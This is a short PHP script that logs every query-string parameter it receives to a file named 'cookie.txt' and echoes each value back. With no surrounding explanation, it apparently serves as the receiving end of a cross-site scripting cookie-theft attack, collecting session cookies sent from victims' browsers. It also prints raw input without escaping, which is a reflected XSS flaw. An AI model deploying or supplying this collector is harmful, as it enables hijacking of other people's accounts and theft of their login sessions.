<?php
$fp = fopen("cookie.txt", "a");
foreach ($_GET as $k=>$v) {
  $data = $k . ":" . $v;
  echo $data . "<br>";
  fputs($fp, $data);
}
fclose($fp);
?>

